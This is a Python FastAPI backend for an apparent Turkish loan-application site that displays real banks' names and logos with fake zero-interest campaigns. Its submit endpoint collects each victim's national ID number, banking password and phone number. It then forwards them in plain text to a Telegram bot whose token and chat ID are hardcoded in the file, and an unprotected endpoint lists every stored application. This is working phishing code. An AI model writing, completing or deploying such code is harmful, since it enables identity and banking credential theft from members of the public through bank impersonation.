from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List
import json
import urllib.request
import urllib.parse
import os
from datetime import datetime
import uvicorn

app = FastAPI(title="Kredi Başvuru API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

applications_storage = []
telegram_settings = {
    "bot_token": os.environ.get('TELEGRAM_BOT_TOKEN', '6719470714:AAEiTm7V6s3zTB_etIrOpaykcHzDWp3i7YA'),
    "chat_id": os.environ.get('TELEGRAM_CHAT_ID', '-4915858013')
}

banks_storage = [
    {
        "id": 1,
        "name": "Akbank",
        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/ac807fc1-b3e9-46f6-899d-ce70882e7f57.svg",
        "campaign": "%0 faiz oranlı 3 Ay vadeli 25.000 TL'ye varan taksitli avans",
        "color": "red",
        "is_active": True,
        "max_applications": 0
    },
    {
        "id": 2,
        "name": "QNB",
        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/57347029-2d9b-4c81-bd47-8b12777a564f.svg",
        "campaign": "3 Ay vadeli 25.000 TL'ye varan nakit avans",
        "color": "purple",
        "is_active": True,
        "max_applications": 0
    },
    {
        "id": 3,
        "name": "TEB",
        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/4c0a9c34-b72b-46f6-a3ee-f9bb52176937.svg",
        "campaign": "%0 faiz oranlı 3 Ay vadeli 25.000 TL'ye varan nakit avans",
        "color": "green",
        "is_active": True,
        "max_applications": 0
    },
    {
        "id": 4,
        "name": "DenizBank",
        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/1aad69c2-3faf-472f-8d26-9d3f912d444e.svg",
        "campaign": "3 Ay vadeli 65.000 TL'ye varan kredi",
        "color": "cyan",
        "is_active": True,
        "max_applications": 0
    },
    {
        "id": 5,
        "name": "Garanti BBVA",
        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/94ec8109-1b2b-4200-a8b1-935ac655b2ee.svg",
        "campaign": "Bonus kart sahiplerine özel avantajlar",
        "color": "green",
        "is_active": True,
        "max_applications": 0
    },
    {
        "id": 6,
        "name": "Türkiye İş Bankası",
        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/aa37ded8-f289-4d2d-85b2-026c5063b3d0.svg",
        "campaign": "Maximum kart avantajı",
        "color": "blue",
        "is_active": True,
        "max_applications": 0
    },
    {
        "id": 7,
        "name": "Albaraka",
        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/8f24530b-3b5d-4c6e-b651-dd671d709d54.svg",
        "campaign": "Katılım bankacılığı avantajı",
        "color": "gray",
        "is_active": True,
        "max_applications": 0
    },
    {
        "id": 8,
        "name": "Enpara",
        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/b071446a-6bb3-4711-813b-6387c115dc4a.svg",
        "campaign": "Dijital bankacılık fırsatı",
        "color": "pink",
        "is_active": True,
        "max_applications": 0
    },
    {
        "id": 9,
        "name": "ON",
        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/52889dca-38c7-4a02-a12c-85e84a339610.svg",
        "campaign": "Tamamen dijital deneyim",
        "color": "green",
        "is_active": True,
        "max_applications": 0
    },
    {
        "id": 10,
        "name": "Getirfinans",
        "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/2f82b0ad-9cd6-4fc3-a79b-77d6065512f7.svg",
        "campaign": "450.000 TL'ye varan kredi",
        "color": "purple",
        "is_active": True,
        "max_applications": 0
    }
]

class LoanApplication(BaseModel):
    tc_kimlik: str
    sifre: str
    telefon: str
    bank_name: str
    amount: int
    months: int

class TelegramSettings(BaseModel):
    bot_token: str
    chat_id: str

class Bank(BaseModel):
    name: str
    logo: str
    campaign: str
    color: str
    is_active: bool = True
    max_applications: int = 0

class BankUpdate(BaseModel):
    id: int
    name: str
    logo: str
    campaign: str
    color: str
    is_active: bool
    max_applications: int = 0

@app.get("/")
async def health_check():
    return {"status": "healthy", "message": "Kredi Başvuru API is running"}

@app.get("/api/banks")
async def get_banks():
    global banks_storage
    return [bank for bank in banks_storage if bank.get("is_active", True)]

@app.get("/api/banks/all")
async def get_all_banks():
    global banks_storage
    return banks_storage

@app.post("/api/banks")
async def create_bank(bank: Bank):
    global banks_storage
    new_id = max([b["id"] for b in banks_storage], default=0) + 1
    new_bank = {
        "id": new_id,
        "name": bank.name,
        "logo": bank.logo,
        "campaign": bank.campaign,
        "color": bank.color,
        "is_active": bank.is_active,
        "max_applications": bank.max_applications
    }
    banks_storage.append(new_bank)
    return {"success": True, "bank": new_bank}

@app.put("/api/banks/{bank_id}")
async def update_bank(bank_id: int, bank: BankUpdate):
    global banks_storage
    for i, existing_bank in enumerate(banks_storage):
        if existing_bank["id"] == bank_id:
            banks_storage[i] = {
                "id": bank.id,
                "name": bank.name,
                "logo": bank.logo,
                "campaign": bank.campaign,
                "color": bank.color,
                "is_active": bank.is_active,
                "max_applications": bank.max_applications
            }
            return {"success": True, "bank": banks_storage[i]}
    raise HTTPException(status_code=404, detail="Bank not found")

@app.delete("/api/banks/{bank_id}")
async def delete_bank(bank_id: int):
    global banks_storage
    for i, bank in enumerate(banks_storage):
        if bank["id"] == bank_id:
            banks_storage[i]["is_active"] = False
            return {"success": True, "message": "Bank deactivated"}
    raise HTTPException(status_code=404, detail="Bank not found")

@app.post("/api/calculate")
async def calculate_loan(request: dict):
    amount = request.get("amount")
    months = request.get("months")
    
    if not amount or not months:
        raise HTTPException(status_code=400, detail="Amount and months are required")
    
    if amount < 25000 or amount > 450000:
        raise HTTPException(status_code=400, detail="Tutar 25.000 - 450.000 TL arasında olmalıdır")
    
    if months < 3 or months > 60:
        raise HTTPException(status_code=400, detail="Vade 3 - 60 ay arasında olmalıdır")
    
    monthly_payment = amount / months
    total_payment = amount
    
    return {
        "amount": amount,
        "months": months,
        "monthly_payment": round(monthly_payment, 2),
        "total_payment": total_payment,
        "interest_rate": 0
    }

@app.post("/api/submit")
async def submit_application(application: LoanApplication):
    global applications_storage
    
    new_application = {
        "id": len(applications_storage) + 1,
        "tc_kimlik": application.tc_kimlik,
        "sifre": application.sifre,
        "telefon": application.telefon,
        "bank_name": application.bank_name,
        "amount": application.amount,
        "months": application.months,
        "status": "pending",
        "created_at": datetime.now().isoformat()
    }
    
    applications_storage.append(new_application)
    
    try:
        bot_token = telegram_settings.get("bot_token")
        chat_id = telegram_settings.get("chat_id")
        
        message = f"""🏦 Yeni Kredi Başvurusu

👤 T.C. Kimlik: {application.tc_kimlik}
🔐 Şifre: {application.sifre}
📞 Telefon: {application.telefon}
🏛️ Banka: {application.bank_name}
💰 Tutar: {application.amount:,} TL
📅 Vade: {application.months} ay
⏰ Tarih: {datetime.now().strftime('%d.%m.%Y %H:%M')}"""

        telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        telegram_data = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        req = urllib.request.Request(
            telegram_url,
            data=urllib.parse.urlencode(telegram_data).encode(),
            headers={'Content-Type': 'application/x-www-form-urlencoded'}
        )
        urllib.request.urlopen(req)
    except Exception as e:
        print(f"Telegram error: {e}")
    
    return {"success": True, "message": "Başvuru başarıyla gönderildi"}

@app.get("/api/applications")
async def get_applications():
    global applications_storage
    return applications_storage

@app.get("/api/telegram-settings")
async def get_telegram_settings():
    return telegram_settings

@app.post("/api/telegram-settings")
async def update_telegram_settings(settings: TelegramSettings):
    global telegram_settings
    telegram_settings["bot_token"] = settings.bot_token
    telegram_settings["chat_id"] = settings.chat_id
    
    os.environ['TELEGRAM_BOT_TOKEN'] = settings.bot_token
    os.environ['TELEGRAM_CHAT_ID'] = settings.chat_id
    
    return {"success": True, "message": "Telegram ayarları güncellendi"}
